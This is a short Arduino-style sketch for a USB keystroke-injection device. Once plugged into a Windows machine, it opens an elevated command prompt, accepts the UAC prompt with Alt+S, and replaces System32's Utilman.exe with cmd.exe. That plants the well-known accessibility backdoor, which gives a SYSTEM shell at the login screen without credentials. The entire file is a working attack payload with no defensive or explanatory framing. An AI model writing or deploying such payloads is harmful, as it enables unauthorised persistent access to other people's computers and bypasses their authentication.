#include <esKeyboard.h>

#define defaultDelay 200
#define _PASS "pancake"

void ENTER()
{
  Keyboard.press(KEY_RETURN);
  delay(5);
  Keyboard.release(KEY_RETURN);
}

void setup()
{
  Keyboard.begin();

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(defaultDelay);

  Keyboard.print("powershell Start-Process cmd -Verb RunAs");
  ENTER();

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('s');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cd \"%systemroot%\\System32\" && xcopy /q /y Utilman.exe Utilman.exe.cpy && xcopy /q /y cmd.exe Utilman.exe");
  ENTER();

  Keyboard.print("exit");
  ENTER();
}

void loop() {  }
